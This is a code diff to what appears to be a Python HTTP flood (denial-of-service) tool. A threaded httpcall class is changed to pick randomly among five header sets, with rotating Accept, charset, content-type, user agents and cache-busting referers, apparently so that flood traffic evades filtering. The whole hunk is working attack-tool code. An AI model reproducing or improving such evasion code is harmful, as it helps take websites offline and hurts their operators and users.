@@ -165,18 +165,64 @@ class httpcall(threading.Thread):
                 except IndexError:
                     continue
                 langcodea = lang()
-                tmp = {
+                contenttypes = ["text/html","text/plain; ","application/json","text/csv","application/pdf","application/zip"]
+                accepts = [f"text/html,{random.choice(contenttypes)},{random.choice(contenttypes)},{random.choice(contenttypes)};q=0.{random.randint(4,9)}",f"*/*;q=0.{random.randint(4,9)}","*/*"]
+                acceptcharset = ["ISO-8859-1","shift-jis","US-ASCII","utf-8"]
+                tmp = []
+                tmp.append({
+                    "Accept":random.choice(accepts),
                     "User-Agent": random.choice(self.useragents),
                     "Cache-Control": "no-cache",
-                    "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
-                    "content-type": "application/json",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
                     "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
                     "Keep-Alive": str(random.randint(110,120)),
                     "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
                     "Connection": "keep-alive",
                     "Host": usehost
-                }
-                header = deepmerge(tmp,self.head)
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Keep-Alive": str(random.randint(110,120)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Connection": "keep-alive",
+                    "Host": usehost
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Keep-Alive": str(random.randint(110,120)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Connection": "keep-alive"
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}",
+                    "Host": usehost
+                })
+                tmp.append({
+                    "Accept": random.choice(accepts),
+                    "User-Agent": random.choice(self.useragents),
+                    "Cache-Control": "no-cache",
+                    "Accept-Charset": f"{random.choice(acceptcharset)};q=0.7,*;q=0.7",
+                    "content-type": random.choice(contenttypes),#
+                    "Referer": random.choice(self.referers) + buildblock(random.randint(5,10)),
+                    "Accept-Language": f"{langcodea},{langcodea};q=0.{random.randint(4,9)}"
+                })
+                header = deepmerge(random.choice(tmp),self.head)
                 if proxy == "":
                     try:
                         if self.usepayload == True:
